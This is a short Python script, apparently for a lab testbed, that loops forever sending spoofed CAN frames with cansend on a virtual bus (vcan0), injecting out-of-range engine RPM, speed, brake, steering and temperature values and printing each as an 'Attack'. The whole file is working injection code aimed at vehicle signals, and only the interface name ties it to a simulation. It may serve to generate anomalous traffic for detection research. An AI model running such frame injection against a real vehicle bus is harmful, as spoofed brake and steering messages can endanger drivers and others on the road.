import os
import time
import random

while True:

    attack = random.choice([
        "engine",
        "speed",
        "brake",
        "steering",
        "temperature"
    ])

    if attack == "engine":
        rpm = random.randint(7000, 9000)
        high = (rpm >> 8) & 0xFF
        low = rpm & 0xFF
        data = f"{high:02X}{low:02X}000000000000"
        os.system(f"cansend vcan0 101#{data}")
        print(f"Attack → Engine RPM: {rpm}")

    elif attack == "speed":
        speed = random.randint(180, 250)
        data = f"{speed:02X}00000000000000"
        os.system(f"cansend vcan0 102#{data}")
        print(f"Attack → Speed: {speed} km/h")

    elif attack == "brake":
        brake = random.randint(101, 255)
        data = f"{brake:02X}00000000000000"
        os.system(f"cansend vcan0 103#{data}")
        print(f"Attack → Brake: {brake}%")

    elif attack == "steering":
        steering = random.randint(451, 900)
        high = (steering >> 8) & 0xFF
        low = steering & 0xFF
        data = f"{high:02X}{low:02X}000000000000"
        os.system(f"cansend vcan0 104#{data}")
        print(f"Attack → Steering Encoded: {steering}")

    elif attack == "temperature":
        temp = random.randint(150, 220)
        data = f"{temp:02X}00000000000000"
        os.system(f"cansend vcan0 105#{data}")
        print(f"Attack → Temperature: {temp}°C")

    time.sleep(1)
